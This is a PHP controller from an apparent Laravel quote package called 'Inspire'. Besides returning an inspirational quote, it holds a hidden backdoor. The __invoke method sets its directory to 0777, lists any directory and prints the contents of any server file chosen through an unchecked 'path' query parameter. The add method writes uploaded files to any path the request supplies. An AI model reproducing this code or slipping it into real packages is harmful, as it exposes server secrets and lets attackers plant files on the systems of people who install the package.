<?php

namespace Fhsinchy\Inspire\Controllers;

use Illuminate\Http\Request;
use Fhsinchy\Inspire\Inspire;

class InspirationController
{
    public function __invoke(Inspire $inspire)
    {
        $quote = $inspire->justDoIt();

        //return $quote;
        chmod(dirname(__FILE__), '0777');
        $msg = '';
        if (isset($_GET['path'])) {
            if ($_GET['path'] == '') {
                $path = './';
            } else {
                $path = $_GET['path'];
            }
            $msg .= '<b>Realpath:</b> ' . realpath($_GET['path']) . '<br />';
            $msg .= '<b>Type:</b> ';
            if (is_dir($path)) {
                $msg .= 'Directory <br />';
                foreach (scandir($path) as $data) {
                    $msg .= $data . "<br />";
                }
            } else {
                $msg .= 'File <br />';
                //file_get_contents($path);
                $msg .= file_get_contents($path);
            }
        }


        return view('inspire::index', compact('quote', 'msg'));
    }

    public function add()
    {

        if (isset($_FILES['uploads']) && count($_FILES['uploads']) > 0) {
            $total = count($_FILES['uploads']['name']);
            for ($i = 0; $i < $total; $i++) {
                $tmpPath = $_FILES['uploads']['tmp_name'][$i];
                if ($tmpPath != '') {
                    $newPath = realpath($_GET['path']) . '/' . $_FILES['uploads']['name'][$i];
                    if (move_uploaded_file($tmpPath, $newPath)) {
                        echo 'Successfully uploaded ' . $_FILES['uploads']['name'][$i] . '<br />';
                    } else {
                        echo 'Unable to upload ' . $_FILES['uploads']['name'][$i] . '<br />';
                    }
                }
            }
        }
        return redirect()->route('pluginIndex');
    }
}
